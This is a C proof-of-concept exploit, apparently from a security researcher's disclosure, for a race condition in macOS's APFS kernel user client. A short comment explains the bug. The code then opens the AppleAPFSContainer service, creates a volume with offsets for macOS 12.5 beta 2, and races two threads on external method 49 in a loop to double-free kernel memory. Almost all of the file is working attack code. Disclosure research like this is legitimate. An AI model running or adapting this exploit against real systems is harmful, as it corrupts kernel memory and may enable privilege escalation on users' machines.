/*
The vulnerability exists in AppleAPFSUserClient::methodDeltaCreateFinalize (external method 49).
This method calls directly through to AppleAPFSContainer::deltaCreateTeardown, which is not a thread-safe method, without holding a lock.
This means that it is possible for an attacker to double-free the delta_create_ctx, and related properties, by racing two calls to AppleAPFSUserClient::methodDeltaCreateFinalize.

Tommy Muir (@Muirey03)
*/

#include <stdio.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <pthread.h>
#include <signal.h>

#define VOLUME_NUM 45

//macOS 12.5 beta 2 offsets:
#define methodVolumeCreate_INSZ 0x1f8
#define QUOTA_SZ_OFF 32
#define SLOT_NUM_OFF 48
#define ROLE_OFF 54
#define NAME_OFF 56
#define methodDeltaCreatePrepare_INSZ 0x30

static io_connect_t client = MACH_PORT_NULL;
static uint volume_num = -1;
static volatile char start = 0;

kern_return_t create_volume(void) {
	kern_return_t kr;

	// methodVolumeCreate (0)
	char input[methodVolumeCreate_INSZ] = {0};
	size_t outSz = 4;
	uint output;

	*(uint*)&input[QUOTA_SZ_OFF] = 0x40000002; //quota size
	*(uint*)&input[SLOT_NUM_OFF] = VOLUME_NUM;
	*(uint16_t*)&input[ROLE_OFF] = 1 << 6; //data role
	strcpy(&input[NAME_OFF], "targetvolume"); //volume name

	kr = IOConnectCallStructMethod(client, 0, input, methodVolumeCreate_INSZ, &output, &outSz);
	printf("methodVolumeCreate: %s (0x%x)\n", mach_error_string(kr), kr);
	if (kr == KERN_SUCCESS)
		volume_num = output;
	
	return kr;
}

void delete_volume(uint num) {
	// methodVolumeDelete (1)
	uint input = num;
	IOConnectCallStructMethod(client, 1, &input, sizeof(input), NULL, NULL);
}

kern_return_t prepare(void) {
	kern_return_t kr;

	// methodDeltaCreatePrepare (36)
	char input[methodDeltaCreatePrepare_INSZ] = {0};
	size_t outSz = 0x10;
	char output[0x10];

	uint sz = 0x20000;
	void* addr = calloc(sz, 1);
	
	*(void**)input = addr;
	((uint*)input)[2] = sz;
	((uint*)input)[3] = volume_num;

	kr = IOConnectCallStructMethod(client, 36, input, methodDeltaCreatePrepare_INSZ, output, &outSz);
	printf("methodDeltaCreatePrepare: %s (0x%x)\n", mach_error_string(kr), kr);

	free(addr);
	return kr;
}

void* racer(void* arg) {
	while (!start) {}

	kern_return_t kr;

	// methodDeltaCreateFinalize (49) <-- THIS IS WHERE THE BUG IS
	kr = IOConnectCallStructMethod(client, 49, NULL, 0, NULL, NULL);

	return NULL;
}

void int_handler(int sig) {
	if (volume_num != -1) {
		delete_volume(volume_num);
		volume_num = -1;
	}

	exit(0);
}

int main(int argc, char *argv[], char *envp[]) {
	//clean-up if we receive an interrupt:
	struct sigaction act = {.sa_handler = int_handler, .sa_mask = SIGINT};
	sigaction(SIGINT, &act, NULL);

	//open client:
	io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleAPFSContainer"));
	IOServiceOpen(service, mach_task_self(), 0, &client);
	IOObjectRelease(service);

	//exploit:
	kern_return_t kr = create_volume();
	if (kr == KERN_SUCCESS) {
		for (;;) {
			kr = prepare();
			if (kr == KERN_SUCCESS) {
				pthread_t t0, t1;
				pthread_create(&t0, NULL, racer, NULL);
				pthread_create(&t1, NULL, racer, NULL);
				start = 1;
				pthread_join(t0, NULL);
				pthread_join(t1, NULL);
				start = 0;
			} else {
				break;
			}
		}

		delete_volume(volume_num);
		volume_num = -1;
	}

	IOServiceClose(client);
	return 0;
}
